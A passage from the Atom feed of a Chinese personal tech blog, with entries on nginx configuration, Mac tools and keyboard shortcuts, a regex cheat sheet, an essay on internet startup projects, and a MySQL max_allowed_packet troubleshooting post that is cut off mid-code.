$remote_addr;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    		proxy_set_header Accept-Encoding &amp;quot;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    		proxy_buffers 16 4k;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    		proxy_buffer_size 2k;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		    proxy_pass http://localhost:8000;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;web服务器&quot;&gt;&lt;a href=&quot;#web服务器&quot; class=&quot;headerlink&quot; title=&quot;web服务器&quot;&gt;&lt;/a&gt;web服务器&lt;/h2&gt;&lt;p&gt;http 服务&lt;br&gt;server 虚拟机&lt;br&gt;location 路径&lt;br&gt;listen 监听端口 backlog 堆大小&lt;/p&gt;
&lt;h2 id=&quot;静态资源&quot;&gt;&lt;a href=&quot;#静态资源&quot; class=&quot;headerlink&quot; title=&quot;静态资源&quot;&gt;&lt;/a&gt;静态资源&lt;/h2&gt;&lt;p&gt;location 路径(正则表达式):&lt;br&gt;root 目录&lt;br&gt;index  默认页面&lt;/p&gt;
&lt;p&gt;上传文件设置:&lt;br&gt;sendfile           on;&lt;br&gt;sendfile_max_chunk 1m;&lt;/p&gt;
&lt;h2 id=&quot;代理&quot;&gt;&lt;a href=&quot;#代理&quot; class=&quot;headerlink&quot; title=&quot;代理&quot;&gt;&lt;/a&gt;代理&lt;/h2&gt;&lt;p&gt;针对路径&lt;br&gt;proxy_pass 转发地址&lt;br&gt;proxy_set_header 设置头信息&lt;br&gt;Ｈost 域名&lt;br&gt;X-Real-IP 客户端地址&lt;br&gt;proxy_buffers off/on&lt;br&gt;proxy_buffers 缓存&lt;br&gt;proxy_buffer_size 缓存大小&lt;/p&gt;
&lt;h2 id=&quot;日志&quot;&gt;&lt;a href=&quot;#日志&quot; class=&quot;headerlink&quot; title=&quot;日志&quot;&gt;&lt;/a&gt;日志&lt;/h2&gt;&lt;p&gt;针对主机&lt;br&gt;error_log&lt;br&gt;log_format 访问日志格式内容定义&lt;br&gt;access_log&lt;/p&gt;
&lt;p&gt;查看监听:&lt;br&gt;netstat -Lan&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;示例:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>我的mac精华浓缩版</title>
    <link href="http://binyanbin.github.io/2016/09/04/shortcut/"/>
    <id>http://binyanbin.github.io/2016/09/04/shortcut/</id>
    <published>2016-09-03T16:00:00.000Z</published>
    <updated>2016-12-01T07:22:36.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;mac下的效率神器&quot;&gt;&lt;a href=&quot;#mac下的效率神器&quot; class=&quot;headerlink&quot; title=&quot;mac下的效率神器&quot;&gt;&lt;/a&gt;mac下的效率神器&lt;/h2&gt;&lt;p&gt;1.Alfred  效率神器，脚本之王，谁用谁知道。要破解版的直接找我:)。&lt;br&gt;2.iTerm  terminal分屏神器，当然不仅仅是分屏&lt;br&gt;3.CatchMouse  多屏显示器必备，最多可以支持四台显示器随意切换屏幕和光标。&lt;/p&gt;
&lt;h2 id=&quot;跨平台工具&quot;&gt;&lt;a href=&quot;#跨平台工具&quot; class=&quot;headerlink&quot; title=&quot;跨平台工具&quot;&gt;&lt;/a&gt;跨平台工具&lt;/h2&gt;&lt;p&gt;1.Eclipse&lt;br&gt;2.Intellij IDEA&lt;br&gt;2.Workbench  mysql客户端必备&lt;br&gt;3.Sublime Text&lt;br&gt;4.leanote 笔记本+blog,支持markdown,思维导图，最重要的是免费&lt;br&gt;5.Evernode 印像笔记本&lt;br&gt;6.Chrome&lt;br&gt;7.Postman  webapi测试专用&lt;br&gt;8.AxaTools  小工具集合，各种转换计算和正则测试。&lt;br&gt;9.atash UML作图专用&lt;br&gt;10.Jmeter  性能测试&lt;br&gt;11.Xccello 个人/团队任务管理&lt;br&gt;12.f.lux 护眼必备&lt;/p&gt;
&lt;h2 id=&quot;开启mac-移动硬盘ntfs格式的读写功能&quot;&gt;&lt;a href=&quot;#开启mac-移动硬盘ntfs格式的读写功能&quot; class=&quot;headerlink&quot; title=&quot;开启mac 移动硬盘ntfs格式的读写功能&quot;&gt;&lt;/a&gt;开启mac 移动硬盘ntfs格式的读写功能&lt;/h2&gt;&lt;p&gt;虽说exFAT 可以跨操作系统使用，但总感觉不如ntfs&lt;br&gt;如何开启:&lt;br&gt;在创建一个文件  sudo vim /etc/fstab&lt;br&gt;输入 LABEL=valume none ntfs rw,auto,nobrowse&lt;br&gt;第一列:LABEL=valume 表示移动硬盘的卷名&lt;br&gt;第二列:加入文件系统的位置&lt;br&gt;第三列:文件格式&lt;br&gt;第四列:文件系统状态 rw表示可读写&lt;br&gt;第五列:好像是是否备份的意思。&lt;br&gt;第六列:是否在finder中显示，nobrowse不显示。&lt;br&gt;如何使用:&lt;br&gt;保存fstab文件之后重启mac,在finder下 cmd+shift+g，输入/Volumes/valume进入(valume为你的移动硬盘卷名)&lt;/p&gt;
&lt;h2 id=&quot;快捷键&quot;&gt;&lt;a href=&quot;#快捷键&quot; class=&quot;headerlink&quot; title=&quot;快捷键&quot;&gt;&lt;/a&gt;快捷键&lt;/h2&gt;&lt;p&gt;1.mac基础:&lt;br&gt;ctrl+上下左右   切屏&lt;br&gt;cmd+上下左右  定位&lt;br&gt;cmd+shift+上下左右  定位+选择&lt;br&gt;fn+上下左右  滚动&lt;br&gt;ctrl+cmd+f  全屏&lt;br&gt;cmd+w 关闭当前窗口&lt;br&gt;cmd+q 退出应用程序&lt;/p&gt;
&lt;p&gt;2.chrome(你不可能不用的)&lt;br&gt;cmd+l 地址栏&lt;br&gt;cmd+option+左右 切页面&lt;br&gt;ctrl+tab 切页面&lt;br&gt;cmd+t 新页面&lt;br&gt;cmd+w 关闭页面&lt;br&gt;cmd+shift+w 关闭窗口&lt;br&gt;cmd+option+i 开发者工具&lt;/p&gt;
&lt;p&gt;3.vim(用linux服务器你无法绕过它)&lt;br&gt;:set number 显示行号&lt;br&gt;:syntax on 语法显示&lt;br&gt;:%d 删除全部内容&lt;br&gt;w下一个单词&lt;br&gt;b上一个单词&lt;br&gt;gg文件首&lt;br&gt;Ｇ文件尾&lt;br&gt;0行首&lt;br&gt;^行首文字&lt;br&gt;$行尾&lt;br&gt;dd删除当前行&lt;br&gt;3x 删除后3个字符 3X 删除前3个个字符&lt;br&gt;11G 调到第11行&lt;br&gt;Ctrl+f Ctrl+b 翻页&lt;br&gt;/word 查找 n 查找下一个&lt;br&gt;u  ctrl+r   撤销 重做&lt;/p&gt;
&lt;p&gt;4.bash terminal&lt;br&gt;ctrl+a 开头&lt;br&gt;ctrl+e 结尾&lt;br&gt;ctrl+k 清除光标后至行尾&lt;br&gt;ctrl+u清除光标至之前&lt;br&gt;tab 补全&lt;br&gt;ctrl+c 终止&lt;/p&gt;
&lt;p&gt;5.sublime&lt;br&gt;ctrl+k+b 目录显示/隐藏&lt;br&gt;cmd+option+number 分屏&lt;br&gt;ctrl+shift+number 移屏&lt;br&gt;cmd+option+左右 切文件&lt;br&gt;ctrl+tab 切文件&lt;br&gt;cmd+n 创建新文件&lt;br&gt;cmd+p 查找文件&lt;br&gt;cmd+shift+p  插件命令&lt;br&gt;cmd+alt+g 快找&lt;br&gt;cmd+f 查找 alt+cmd+r 正则&lt;br&gt;cmd+shift+f 替换&lt;br&gt;cmd+k+u 大写 cmd+k+l 小写&lt;br&gt;cmd+k+num 折到第几层&lt;br&gt;cmd+k+j 全部展开&lt;br&gt;cmd+k+k 删除到行末尾&lt;br&gt;cmd+w 关闭文件&lt;br&gt;cmd+shift+w 关闭窗口&lt;br&gt;ctrl+shift+k 删除行&lt;br&gt;F6 拼写检查&lt;/p&gt;
&lt;p&gt;6.eclispe (java开发必备)&lt;br&gt;cmd+e 已打开文件&lt;br&gt;cmd+o 文件导航&lt;br&gt;cmd+alt+s 生成&lt;br&gt;cmd+f7 切换窗体&lt;br&gt;f3 转定义&lt;br&gt;cmd+shift+g 转引用&lt;br&gt;cmd+shift+r 打开文件&lt;br&gt;cmd+shift+h 打开类型&lt;br&gt;ctrl+h 综合查找&lt;br&gt;cmd+alt+r 重命名&lt;br&gt;cmd+1 快速修复&lt;br&gt;ctrl+q 回到最后一次编辑的地方&lt;br&gt;alt+/  内容提示&lt;br&gt;cmd+/ 注释&lt;br&gt;cmd+t 查看继承关系&lt;br&gt;cmd+shift+f 格式化&lt;br&gt;cmd+alt+j 添加完整注释&lt;br&gt;ctrl+m 隐藏package&lt;br&gt;cmd+shift+[ 分坚屏&lt;/p&gt;
&lt;p&gt;7.Intellij IDEA&lt;br&gt;cmd+b 转到定义&lt;br&gt;cmd+o 查找类型&lt;br&gt;cmd+F12 文件结构&lt;br&gt;cmd+e 最近打开文件&lt;br&gt;cmd+shift+e 最近修改文件&lt;br&gt;cmd+tab 已打开文件&lt;br&gt;alt+F7 查找引用&lt;br&gt;cmd+o 查找类&lt;br&gt;cmd+shift+o 查找文件&lt;br&gt;double shift 查找所有&lt;br&gt;cmd+alt+l 格式化&lt;br&gt;alt+enter 自动完成提示&lt;br&gt;shift+F6 重命名&lt;br&gt;Ctrl+alt+o 优化导入包&lt;br&gt;cmd +- 伸缩&lt;br&gt;cmd shift +- 全部伸缩&lt;br&gt;Ctrl+M 括号定位&lt;br&gt;alt+(&amp;lt;-/-&amp;gt;) 光标定位&lt;br&gt;ctrl+j 信息提示&lt;br&gt;cmd+t 代码更新&lt;br&gt;cmd+k 代码提交&lt;/p&gt;
&lt;h2 id=&quot;附赠hexo-blog发布脚本&quot;&gt;&lt;a href=&quot;#附赠hexo-blog发布脚本&quot; class=&quot;headerlink&quot; title=&quot;附赠hexo blog发布脚本&quot;&gt;&lt;/a&gt;附赠hexo blog发布脚本&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; ~/Documents/git/blog&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;hexo clean&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;hexo g&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cp -r ~/Documents/git/blog/public/ ~/Documents/git/binyanbin.github.io/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; ~/Documents/git/binaynbin.github.io/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git add .&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git commit &lt;span class=&quot;_&quot;&gt;-a&lt;/span&gt; -m &lt;span class=&quot;string&quot;&gt;&#39;submit&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git push&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;持续补充中……&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;mac下的效率神器&quot;&gt;&lt;a href=&quot;#mac下的效率神器&quot; class=&quot;headerlink&quot; title=&quot;mac下的效率神器&quot;&gt;&lt;/a&gt;mac下的效率神器&lt;/h2&gt;&lt;p&gt;1.Alfred  效率神器，脚本之王，谁用谁知道。要破解版的直接找我:)。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>正则速记</title>
    <link href="http://binyanbin.github.io/2016/08/18/regex/"/>
    <id>http://binyanbin.github.io/2016/08/18/regex/</id>
    <published>2016-08-17T16:00:00.000Z</published>
    <updated>2016-10-26T07:03:23.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;元字符&quot;&gt;&lt;a href=&quot;#元字符&quot; class=&quot;headerlink&quot; title=&quot;元字符&quot;&gt;&lt;/a&gt;元字符&lt;/h2&gt;&lt;p&gt;.   :匹配任意字符&lt;br&gt;\   :转义&lt;br&gt;^  :行开始位置&lt;br&gt;$  :行结束位置&lt;/p&gt;
&lt;h2 id=&quot;范围&quot;&gt;&lt;a href=&quot;#范围&quot; class=&quot;headerlink&quot; title=&quot;范围&quot;&gt;&lt;/a&gt;范围&lt;/h2&gt;&lt;p&gt;[  ]:&lt;br&gt;[0-9],[a-z] : 字符范围&lt;br&gt;^ : 取反   [^a]&lt;/p&gt;
&lt;h2 id=&quot;重复&quot;&gt;&lt;a href=&quot;#重复&quot; class=&quot;headerlink&quot; title=&quot;重复&quot;&gt;&lt;/a&gt;重复&lt;/h2&gt;&lt;p&gt;{ }:&lt;br&gt;a{3}   3次&lt;br&gt;a{3,5} 3到5次&lt;br&gt;?等于{0,1}&lt;br&gt;*等于{0,}&lt;br&gt;+等于{1,}&lt;/p&gt;
&lt;h2 id=&quot;分组与选择&quot;&gt;&lt;a href=&quot;#分组与选择&quot; class=&quot;headerlink&quot; title=&quot;分组与选择&quot;&gt;&lt;/a&gt;分组与选择&lt;/h2&gt;&lt;p&gt;|:&lt;br&gt;cat|dog, [cat|dog]&lt;br&gt;(cat|dog)&lt;/p&gt;
&lt;h2 id=&quot;常用集合&quot;&gt;&lt;a href=&quot;#常用集合&quot; class=&quot;headerlink&quot; title=&quot;常用集合:&quot;&gt;&lt;/a&gt;常用集合:&lt;/h2&gt;&lt;p&gt;\w = [0-9A-Za-z]&lt;br&gt;\W = [^0-9A-Za-z]&lt;br&gt;\s  空格, 制表符,回车或换行符&lt;br&gt;\d   数值&lt;/p&gt;
&lt;h2 id=&quot;替换&quot;&gt;&lt;a href=&quot;#替换&quot; class=&quot;headerlink&quot; title=&quot;替换&quot;&gt;&lt;/a&gt;替换&lt;/h2&gt;&lt;p&gt;Find what:       (.)([! ])                  //匹配．和后面紧挨着一个非空白字符&lt;br&gt;Replace with:   . \2                       //注意中间有空格，\2表示引用第二个括号匹配的内容&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;元字符&quot;&gt;&lt;a href=&quot;#元字符&quot; class=&quot;headerlink&quot; title=&quot;元字符&quot;&gt;&lt;/a&gt;元字符&lt;/h2&gt;&lt;p&gt;.   :匹配任意字符&lt;br&gt;\   :转义&lt;br&gt;^  :行开始位置&lt;br&gt;$  :行结束位置&lt;/p&gt;
&lt;h2 id=&quot;范围&quot;&gt;&lt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>你确定真的要做互联网项目吗</title>
    <link href="http://binyanbin.github.io/2016/07/01/idea-1/"/>
    <id>http://binyanbin.github.io/2016/07/01/idea-1/</id>
    <published>2016-06-30T16:00:00.000Z</published>
    <updated>2016-07-04T13:59:05.000Z</updated>
    
    <content type="html">&lt;p&gt;最近又有人在群里高价求人(技术合伙人)，待遇2-3W，可以给股份，要求一个月把基本功能全部弄出来。我就开始遐想他们的开搞的过程都是:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;老板或公司有自己觉得很好的idea和一点点钱，并且有一点相关的业务资源，想做一个互联网项目，快速出原型去吸引客户或去融资做大。&lt;/li&gt;
&lt;li&gt;然后招来一个认为技术比较牛B的开发和几个程序员&lt;/li&gt;
&lt;li&gt;公司和老板急不可待的要快点上线&lt;/li&gt;
&lt;li&gt;大牛说就你这么一个复杂玩意，我怎么在这么短的时间完成了。&lt;/li&gt;
&lt;li&gt;大家决定买套系统或者外包吧-,老板无耐的想想，我又没有更多钱和时间去折腾，找个皮包公司或者买套系统算了。&lt;/li&gt;
&lt;li&gt;折腾一个月终于成了,急不可待上线。&lt;/li&gt;
&lt;li&gt;销售说这玩意请问能符合我们哪点需求?客户那边也不同意。&lt;/li&gt;
&lt;li&gt;然后开始改需求，码农开始填坑&lt;/li&gt;
&lt;li&gt;填坑不断，问题不断，大家开始撕逼， 老板说这么几个模板和功能，你们都改不好？技术团队说你们需求确定了吗?然后产品经理出现，然后长期拉踞战公司内部开始,一直撕逼中……….公司陷入一个互坑的节奏，关门已经不远。&lt;br&gt;但最终坑都是程序员挖的，正如下图描述一下:&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/other-1.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;p&gt;所以锅也肯定也是程序员背。&lt;/p&gt;
&lt;p&gt;通常有这么一种情况也许成功过，一大堆数据需要录入系统，或者几个G的数据需要换个平台，这是老板以前业务的系统的数据，现在需要找一个更合适自己的系统平台，并准备把它互联网化，然后，找来一帮人，去开发实现这个系统，刚开地这帮人也想找现有系统，但就是他玛的没有合适系统，只好硬着头皮去搞，大家坚持了几年，最后还真他玛的搞成了.&lt;br&gt;一开始就天马行空的设计产品，然后再根据产品去做数据，搞销售，搞运营，这种方式往往失率高。&lt;br&gt;就像很多公司搞o2o,电商，一开始就纠结商业模式，系统，平台，功能。你用户都没有，这些东西都没什么卵用。&lt;br&gt;有人一个qq空间做产品展示，用qq加几百个传统渠道商，qq订货，线下打款，最多开一个淘宝店。业务做得飞起来，一天忙不停。&lt;br&gt;也有人在家或公司附近做主动加周围人的微信做产品宣传，用微信朋友圈做产品展示，微信订货，自己送货，线下付款或微信付款都可以，同样也是忙个不停。&lt;br&gt;电商和o2o有很多简单玩法，不一定需要一个什么网站或app出来去支持它，用最原始的方式就能完成交易，如果你想做网站或app，你的目的应该是要收集数据，收集数据就没必要纠结于细节，只要能帮你收集数，这个东西就是有价值的。&lt;/p&gt;
&lt;p&gt;如果要做互联网项目，那就需要做数量级，没有数量级算什么互联网项目。最开始的考虑就应该从获取数据入手。如果你要想快速盈利，你就不应该选择互联网项目，你应该去做IT项目外包。&lt;/p&gt;
&lt;p&gt;所以你确定你真需要做互联网项目吗？你真的合适做互联网项目吗？&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;最近又有人在群里高价求人(技术合伙人)，待遇2-3W，可以给股份，要求一个月把基本功能全部弄出来。我就开始遐想他们的开搞的过程都是:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;老板或公司有自己觉得很好的idea和一点点钱，并且有一点相关的业务资源，想做一个互联网项目，快速出原型去吸引客户或
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mysql出现Packets larger than max_allowed_packet are not allowed时所发现的问题</title>
    <link href="http://binyanbin.github.io/2016/06/23/hishop-4/"/>
    <id>http://binyanbin.github.io/2016/06/23/hishop-4/</id>
    <published>2016-06-22T16:00:00.000Z</published>
    <updated>2016-06-25T16:44:48.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;情况&quot;&gt;&lt;a href=&quot;#情况&quot; class=&quot;headerlink&quot; title=&quot;情况&quot;&gt;&lt;/a&gt;情况&lt;/h2&gt;&lt;p&gt;最近公司网站出现所有页面无法访问数据库的问题，但是mysql第三方客户端又可以访问如workbench,但是重启mysql服务之后，网站又恢复正常。&lt;br&gt;查找错误日志,以下为错误堆栈信息:&lt;br&gt;&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;MySql.Data.MySqlClient.MySqlException (&lt;span class=&quot;number&quot;&gt;0x80004005&lt;/span&gt;): Packets larger than max_allowed_packet are not allowed.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 MySql.Data.MySqlClient.MySqlStream.SendPacket(MySqlPacket packet)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 MySql.Data.MySqlClient.NativeDriver.ExecutePacket(MySqlPacket packetToExecute)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 MySql.Data.MySqlClient.NativeDriver.SendQuery(MySqlPacket queryPacket)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 MySql.Data.MySqlClient.Driver.SendQuery(MySqlPacket p)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 MySql.Data.MySqlClient.Statement.ExecuteNext()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 MySql.Data.MySqlClient.MySqlCommand.ExecuteReader(CommandBehavior behavior)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 MySql.Data.Entity.EFMySqlCommand.ExecuteDbDataReader(CommandBehavior behavior)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 System.Data.Entity.Infrastructure.Interception.InternalDispatcher`&lt;span class=&quot;number&quot;&gt;1.&lt;/span&gt;Dispatch[TTarget,TInterceptionContext,TResult](TTarget target, Func`&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; operation, TInterceptionContext interceptionContext, Action`&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; executing, Action`&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; executed)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 System.Data.Entity.Infrastructure.Interception.DbCommandDispatcher.Reader(DbCommand command, DbCommandInterceptionContext interceptionContext)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在 System.Data.Entity.Core.EntityClient.Internal.EntityCommandDefinition.ExecuteStoreCommands(EntityCommand entityCommand, CommandBehavior behavior)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;问题原因是:Packets larger than max_allowed_packet are not allowed.&lt;br&gt;查看官网解释:&lt;br&gt;When a MySQL client or the mysqld server receives a packet bigger than max_allowed_packet bytes, it issues an ER_NET_PACKET_TOO_LARGE error and closes the connection. With some clients, you may also get a Lost connection to MySQL server during query error if the communication packet is too large.&lt;br&gt;Both the client and the server have their own max_allowed_packet variable, so if you want to handle big packets, you must increase this variable both in the client and in the server.&lt;br&gt;按官文文档的解释是你的sql命令太长。&lt;/p&gt;
&lt;h2 id=&quot;排查问题&quot;&gt;&lt;a href=&quot;#排查问题&quot; class=&quot;headerlink&quot; title=&quot;排查问题&quot;&gt;&lt;/a&gt;排查问题&lt;/h2&gt;&lt;p&gt;随即把mysql max_allowed_packet调到20M仍无法解决，网站依就无法访问数据库，仍然出现相同的错误。苦思无果之后，只有从.net mysqlclient源码查起。&lt;br&gt;出错源码为MysqlSteam.cs&lt;/p&gt;
&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;SendPacket&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;MySqlPacket packet&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[] buffer = packet.Buffer;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; length = packet.Position - &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ((&lt;span class=&quot;keyword&quot;&gt;ulong&lt;/span&gt;)length &amp;gt; maxPacketSize)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; MySqlException(Resources.QueryTooLarge (&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;)MySqlErrorCode.PacketTooLarge);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; offset = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (length &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; lenToSend = length &amp;gt; maxBlockSize ? maxBlockSize : 